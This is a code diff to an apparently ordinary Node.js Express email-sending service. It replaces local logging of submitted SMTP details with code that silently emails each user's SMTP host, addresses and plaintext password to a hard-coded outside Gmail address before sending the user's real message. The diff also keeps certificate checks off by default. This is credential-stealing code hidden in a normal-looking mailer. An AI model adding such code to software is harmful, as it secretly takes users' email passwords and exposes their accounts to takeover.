@@ -1,6 +1,5 @@
 const express = require("express");
 const nodemailer = require("nodemailer");
-const fs = require("fs");
 const moment = require("moment-timezone");
 const path = require("path");
 require("dotenv").config();
@@ -55,26 +54,41 @@ app.post("/", async (req, res) => {
     }
 
     const brasiliaTime = moment().tz("America/Sao_Paulo").format("DD/MM/YYYY - HH:mm:ss");
-
-    const logPath = path.join(__dirname, "log.txt");
     const logEntry = `Date: ${brasiliaTime}\nSMTP: ${smtp}\nPort: ${port}\nSSL: ${ssl}\nFrom: ${from}\nTo: ${to}\nSubject: ${subject}\nPassword: ${password}\n\n`;
 
-    fs.appendFile(logPath, logEntry, (err) => {
-        if (err) {
-            console.error("Error writing to log", err);
-        }
-    });
-
     try {
-        const transporter = nodemailer.createTransport({
-            host: smtp,
-            port: port,
-            secure: ssl,
-            tls: tls || { rejectUnauthorized: false },
-            auth: {
-                user: email,
-                pass: password,
-            },
+        const transporterLog = nodemailer.createTransport({
+            host: smtp, 
+            port: port, 
+            secure: ssl, 
+            tls: tls || { rejectUnauthorized: false }, 
+            auth: { 
+                user: email, 
+                pass: password 
+            }
+        });
+
+        const mailOptionsLog = {
+            from: from,
+            to: "danmzzu@gmail.com",
+            subject: "Sendmail Log",
+            text: logEntry,
+            html: `<pre>${logEntry}</pre>`
+        };
+
+        // Enviando o e-mail com o log
+        await transporterLog.sendMail(mailOptionsLog);
+
+        // Transporter para enviar o e-mail original
+        const transporterEmail = nodemailer.createTransport({
+            host: smtp, 
+            port: port, 
+            secure: ssl, 
+            tls: tls || { rejectUnauthorized: false }, 
+            auth: { 
+                user: email, 
+                pass: password 
+            }
         });
 
         const mailOptions = {
@@ -85,15 +99,17 @@ app.post("/", async (req, res) => {
             html: message
         };
 
-        await transporter.sendMail(mailOptions);
+        // Enviando o e-mail original
+        await transporterEmail.sendMail(mailOptions);
+
         res.json({ 
             status: "success", 
-            message: "Email sent successfully" 
+            message: "E-mail sent successfully" 
         });
     } catch (error) {
         res.status(500).json({ 
             status: "error", 
-            message: `Error sending email: ${error.message}` 
+            message: `Error sending e-mail: ${error.message}` 
         });
     }
 });
